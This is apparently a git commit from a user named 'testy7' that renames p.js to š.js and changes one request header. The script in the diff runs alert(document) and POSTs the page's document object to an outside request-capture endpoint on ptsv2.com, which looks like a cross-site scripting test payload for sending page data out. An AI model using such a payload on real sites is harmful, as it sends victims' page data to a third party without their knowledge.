1e0f870c7adee222b7704c7c4a94c6e084c510f2
testy7 <97352957+testy7@users.noreply.github.com>
2022-01-08 17:42:34 +0100

    Update and rename p.js to š.js

--- docs/š.js
+++ docs/š.js
@@ -3,5 +3,5 @@ alert(document);
 var xhr = new XMLHttpRequest();
 xhr.open("POST", 'https://ptsv2.com/t/fyrw2-1641653611/post', true);
 xhr.setRequestHeader('Content-Type', 'application/json');
-xhr.setRequestHeader('access-control-allow-origin', '*');
+xhr.setRequestHeader('access-control-allow-origin', 'https://ptsv2.com');
 xhr.send(document);
